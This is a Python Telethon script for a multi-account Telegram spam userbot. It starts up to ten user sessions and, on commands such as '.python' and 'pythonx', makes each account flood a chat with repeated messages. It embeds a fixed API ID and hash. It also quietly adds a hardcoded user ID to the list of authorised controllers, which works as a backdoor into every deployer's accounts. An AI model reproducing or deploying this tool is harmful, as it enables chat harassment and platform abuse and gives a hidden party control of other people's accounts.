import asyncio
import sys
import os
from os import getenv
from DataX import OneWord

from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession

load_dotenv()


MK1 = getenv("STRING")
MK2 = getenv("STRING2")
MK3 = getenv("STRING3")
MK4 = getenv("STRING4")
MK5 = getenv("STRING5")
MK6 = getenv("STRING6")
MK7 = getenv("STRING7")
MK8 = getenv("STRING8")
MK9 = getenv("STRING9")
MK10 = getenv("STRING10")

MK_USERS = list(map(int, getenv("SUDO").split()))
MK_USERS.append(5490005358)


M1 = ""
M2 = ""
M3 = ""
M4 = ""
M5 = ""
M6 = ""
M7 = ""
M8 = ""
M9 = ""
M10 = ""

async def StartMK():
    global M1
    global M2
    global M3
    global M4
    global M5
    global M6
    global M7
    global M8
    global M9
    global M10

    if MK1:
        M1 = TelegramClient(StringSession(MK1), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M1.start()
        except Exception as e:
            print(e)
    else:
        M1 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M1.start()
        except Exception as e:
            pass

    if MK2:
        M2 = TelegramClient(StringSession(MK2), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M2.start()
        except Exception as e:
            print(e)
    else:
        M2 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M2.start()
        except Exception as e:
            pass

    if MK3:
        M3 = TelegramClient(StringSession(MK3), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M3.start()
        except Exception as e:
            print(e)
    else:
        M3 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M3.start()
        except Exception as e:
            pass

    if MK4:
        M4 = TelegramClient(StringSession(MK4), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M4.start()
        except Exception as e:
            print(e)
    else:
        M4 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M4.start()
        except Exception as e:
            pass

    if MK5:
        M5 = TelegramClient(StringSession(MK5), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M5.start()
        except Exception as e:
            print(e)
    else:
        M5 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M5.start()
        except Exception as e:
            pass

    if MK6:
        M6 = TelegramClient(StringSession(MK6), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M6.start()
        except Exception as e:
            print(e)
    else:
        M6 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M6.start()
        except Exception as e:
            pass

    if MK7:
        M7 = TelegramClient(StringSession(MK7), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M7.start()
        except Exception as e:
            print(e)
    else:
        M7 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M7.start()
        except Exception as e:
            pass    

    if MK8:
        M8 = TelegramClient(StringSession(MK8), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M8.start()
        except Exception as e:
            print(e)
    else:
        M8 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M8.start()
        except Exception as e:
            pass   

    if MK9:
        M9 = TelegramClient(StringSession(MK9), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M9.start()
        except Exception as e:
            print(e)
    else:
        M9 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M9.start()
        except Exception as e:
            pass   

    if MK10:
        M10 = TelegramClient(StringSession(MK10), "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M10.start()
        except Exception as e:
            print(e)
    else:
        M10 = TelegramClient("startup", "10609926", "d49128f7a457a3e8d3be96f0a89028f4")
        try:
            await M10.start()
        except Exception as e:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(StartMK())


@M1.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.python"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.python"))
async def spam(e):
    if e.sender_id in MK_USERS:
        aries = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        mk = await e.get_reply_message()
        if len(aries) == 2:
            message = str(aries[1])
            for _ in range(int(aries[0])):
                await e.client.send_message(e.chat_id, message)
                await asyncio.sleep(0.1)
        elif e.reply_to_msg_id and mk.text:
            message = mk.text
            for _ in range(int(aries[0])):
                await e.client.send_message(e.chat_id, message)
                await asyncio.sleep(0.1)



@M1.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M2.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M3.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M4.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M5.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M6.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M7.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M8.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M9.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
@M10.on(events.NewMessage(incoming=True, pattern=r"pythonx"))
async def oneword(e):
    if e.sender_id in MK_USERS:
        for Msg in OneWord:
            await e.client.send_message(e.chat_id, Msg)
            await asyncio.sleep(0.1)


@M1.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in MK_USERS:
        await e.reply("𝐄𝐑𝐑𝟎𝐑 420: RESTARTING.. 🥵", parse_mode=None, link_preview=None)
        try:
            await M1.disconnect()
        except Exception as e:
            pass
        try:
            await M2.disconnect()
        except Exception as e:
            pass
        try:
            await M3.disconnect()
        except Exception as e:
            pass
        try:
            await M4.disconnect()
        except Exception as e:
            pass
        try:
            await M5.disconnect()
        except Exception as e:
            pass
        try:
            await M6.disconnect()
        except Exception as e:
            pass
        try:
            await M7.disconnect()
        except Exception as e:
            pass
        try:
            await M8.disconnect()
        except Exception as e:
            pass
        try:
            await M9.disconnect()
        except Exception as e:
            pass
        try:
            await M10.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@M1.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in MK_USERS:
        text = f" 𝐇𝐀𝐂𝐊𝐄𝐑 ✘ 𝐒𝐏𝐀𝐌 🤖!\n✘ #𝐇𝐀𝐂𝐊𝐄𝐑 \n ⚡𝐇𝐀𝐂𝐊𝐄𝐑 𝐁𝐎𝐋𝐓𝐄⚡"
        await e.reply(text, parse_mode=None, link_preview=None )



print("\n𝐇𝐀𝐂𝐊𝐄𝐑𝐱𝐒𝐏𝐀𝐌 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 😎🤘🏻\nMy Master ---> 𝐇𝐀𝐂𝐊𝐄𝐑")

if len(sys.argv) not in (1, 3, 4):
    try:
        M1.disconnect()
    except Exception as e:
        pass
    try:
        M2.disconnect()
    except Exception as e:
        pass
    try:
        M3.disconnect()
    except Exception as e:
        pass
    try:
        M4.disconnect()
    except Exception as e:
        pass
    try:
        M5.disconnect()
    except Exception as e:
        pass
    try:
        M6.disconnect()
    except Exception as e:
        pass
    try:
        M7.disconnect()
    except Exception as e:
        pass
    try:
        M8.disconnect()
    except Exception as e:
        pass
    try:
        M9.disconnect()
    except Exception as e:
        pass
    try:
        M10.disconnect()
    except Exception as e:
        pass
else:
    try:
        M1.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M5.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M6.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M7.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M8.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M9.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M10.run_until_disconnected()
    except Exception as e:
        pass
